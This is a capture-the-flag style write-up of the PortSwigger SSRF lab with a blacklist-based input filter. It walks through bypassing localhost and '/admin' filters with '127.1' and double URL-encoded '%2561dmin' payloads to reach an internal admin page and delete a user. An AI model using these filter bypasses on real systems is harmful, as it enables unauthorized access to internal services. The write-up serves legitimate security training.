# PortSwigger Lab: SSRF with Blacklist-Based Input Filter

## Objective

Exploit the SSRF vulnerability in the stock check functionality to access the internal administration interface and delete the user `carlos`.

---

## Vulnerability

The application uses the `stockApi` parameter to retrieve stock information from a back-end system. Although the developer implemented blacklist-based protections to block access to localhost and the `/admin` endpoint, these defenses can be bypassed using alternative IP representations and double URL encoding.

---

## Steps

### 1. Intercept the Stock Check Request

Browse to any product and click **Check Stock**.

Capture the request in Burp Suite and send it to Repeater.

Original request:

```http
POST /product/stock HTTP/2

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

---

### 2. Test Access to localhost

Replace the parameter value with:

```text
http://127.0.0.1/
```

The request is blocked by the application's blacklist filter.

---

### 3. Bypass the localhost Filter

Use an alternative representation of localhost:

```text
http://127.1/
```

The request succeeds, confirming that `127.1` resolves to `127.0.0.1`.

---

### 4. Attempt to Access the Admin Interface

Modify the URL:

```text
http://127.1/admin
```

The request is blocked because the application filters the string:

```text
/admin
```

---

### 5. Bypass the Path Filter

Double URL-encode the letter `a`:

```text
a → %61
% → %25
```

Result:

```text
a → %2561
```

Use the payload:

```text
http://127.1/%2561dmin
```

The server decodes the value twice and accesses:

```text
http://127.0.0.1/admin
```

The response contains the administration interface.

---

### 6. Identify the Delete Endpoint

Inspect the response and locate the link used to delete the target user:

```text
/admin/delete?username=carlos
```

---

### 7. Delete the User

Apply the same double-encoding technique to the path:

```text
http://127.1/%2561dmin/delete?username=carlos
```

Send the request.

The server performs the request internally and deletes the user `carlos`, solving the lab.

---

## Payloads Used

### Bypass localhost filter

```text
http://127.1/
```

### Access admin interface

```text
http://127.1/%2561dmin
```

### Delete target user

```text
http://127.1/%2561dmin/delete?username=carlos
```

---

## Explanation

The application attempted to prevent SSRF by blacklisting:

* `127.0.0.1`
* `/admin`

However, the defenses were weak:

* `127.1` was accepted as an alternative representation of localhost.
* Double URL encoding (`%2561`) bypassed the `/admin` filter because the application and the back-end server decoded the URL differently.

As a result, the server was tricked into requesting:

```text
http://127.0.0.1/admin/delete?username=carlos
```

allowing the attacker to access the internal administration interface and remove the target user.

---


